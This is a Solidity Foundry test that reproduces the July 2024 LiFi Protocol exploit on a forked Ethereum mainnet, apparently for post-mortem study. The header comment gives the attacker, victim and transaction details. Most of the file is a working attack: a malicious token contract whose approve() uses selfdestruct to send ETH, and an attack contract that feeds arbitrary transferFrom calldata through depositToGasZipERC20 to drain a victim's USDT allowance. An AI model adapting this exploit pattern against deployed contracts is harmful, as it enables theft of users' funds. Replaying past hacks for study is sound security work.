// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

// Foundry
import {console} from "@forge-std/Console.sol";

// OpenZeppelin
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";

// Local Interfaces
import {IGasZipFacet} from "src/interfaces/IGasZipFacet.sol";

// Local Libraries
import {Mainnet} from "src/utils/Addresses.sol";
import {Constants} from "src/utils/Constants.sol";

// Base for tests
import {Contracts} from "src/utils/Contracts.sol";
import {Base_Test_} from "src/Base.sol";

/**
 * KeyInfo - Total Lost :       2.2m$
 * Protocol Attacked:           LiFi Protocol (Used in https://jumper.exchange)
 * Attacker:                    0x8b3cb6bf982798fba233bca56749e22eec42dcf3 (One of the biggest attack, then replicated by others)
 * Attack Contract:             0x986aca5f2ca6b120f4361c519d7a49c5ac50c240
 * Vulnerable Contract:         0xf28a352377663ca134bd27b582b1a9a4dad7e534 (used in diamond proxy 0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae)
 * Attack tx:                   0xd82fe84e63b1aa52e1ce540582ee0895ba4a71ec5e7a632a3faa1aff3e763873
 * Attack block:                20318963
 * Blockchain:                  Ethereum
 * Vulnerable Contract Code:    https://vscode.blockscan.com/ethereum/0xf28a352377663ca134bd27b582b1a9a4dad7e534
 *
 * Analysis
 * Post-mortem:
 * Twitter Guy:
 * Hacking God:
 *
 * Explanation:
 * In this attack, the attacker used the infinite approval granted by the victim to the LiFi Router contract to steal all the USDT tokens from the victim.
 * 1. Create a malicious token (details will come later)
 * 2. Create an attack contract which will call the `depositToGasZipERC20()` function on LiFi Router contract, using malicious token as sendingAssetId and receivingAssetId.
 * 3. When the LiFi Router contract will call the approve on the malicious token, the malicious token  create a new contract, that selfdestruct to LiFi and send it 1wei of ETH.
 * 4. It does it 2 times, one for approve 0, one for approve max. (This is not the hack part, this is only for passing last checks).
 * 5. The LiFi Router contract will call the USDT contract with the calldata passed in argument, which will transfer all the USDT from the victim to the attacker.
 *      This is where the hack happens, lack of parameters check.
 * 6. The attacker will get all the USDT from the victim.
 */
contract Hack_LiFi is Base_Test_ {
    //////////////////////////////////////////////////////
    /// --- CONSTANTS & IMMUTABLES
    //////////////////////////////////////////////////////
    address public constant VICTIME = 0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;
    address public constant ATTACKER = 0x03560A9D7A2c391FB1A087C33650037ae30dE3aA;
    uint256 public constant ATTACK_BLOCK_NUMBER = 20318963;

    //////////////////////////////////////////////////////
    /// --- ATTACK CONTRACT
    //////////////////////////////////////////////////////

    Attack_Token_1 public attackToken1;
    Attack_Contract_1 public attackContract1;

    //////////////////////////////////////////////////////
    /// --- SETUP
    //////////////////////////////////////////////////////
    function setUp() public override {
        vm.label(VICTIME, "Victime");
        vm.label(ATTACKER, "Attacker");
        super.setUp();

        // Create a fork of the mainnet
        vm.createSelectFork(vm.envString("PROVIDER_URL_MAINNET"), ATTACK_BLOCK_NUMBER - 1);

        // Deploy the attack contract
        attackToken1 = new Attack_Token_1(address(LIFI_ROUTER));
        attackContract1 = new Attack_Contract_1(attackToken1, ATTACKER);
    }

    function test_LiFi_Attack_2024_07_16() public {
        vm.startPrank(ATTACKER);
        attackContract1.attack();
        vm.stopPrank();

        console.log("Attacker balance: %s USDT", USDT.balanceOf(ATTACKER) / 1e6);
    }
}

contract Attack_Contract_1 is Contracts {
    address public immutable ATTACKER;
    address public constant VICTIME = 0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;
    Attack_Token_1 public attackToken1;

    constructor(Attack_Token_1 _attackToken1, address _attacker) {
        attackToken1 = _attackToken1;
        ATTACKER = _attacker;
    }

    function attack() public {
        uint256 victimeBalance = USDT.balanceOf(VICTIME);
        //uint256 victimeApproval = USDT.allowance(VICTIME, address(LIFI_ROUTER));

        LIFI_ROUTER.depositToGasZipERC20(
            IGasZipFacet.SwapData({
                callTo: address(USDT),
                approveTo: address(this),
                sendingAssetId: address(attackToken1),
                receivingAssetId: address(attackToken1),
                fromAmount: uint256(1),
                callData: abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIME, ATTACKER, victimeBalance),
                requiresDeposit: true
            }),
            0,
            address(this)
        );
    }
}

contract Attack_Token_1 is Contracts {
    address lifi;

    constructor(address _lifi) {
        lifi = _lifi;
    }

    function balanceOf(address) public pure returns (uint256) {
        return 1;
    }

    function allowance(address, address) public pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) public returns (bool) {
        Suicide_Contract suicideContract = new Suicide_Contract();
        suicideContract.sendTo{value: 1}(lifi);
        return true;
    }
}

contract Suicide_Contract {
    function sendTo(address _to) public payable {
        selfdestruct(payable(_to));
    }
}
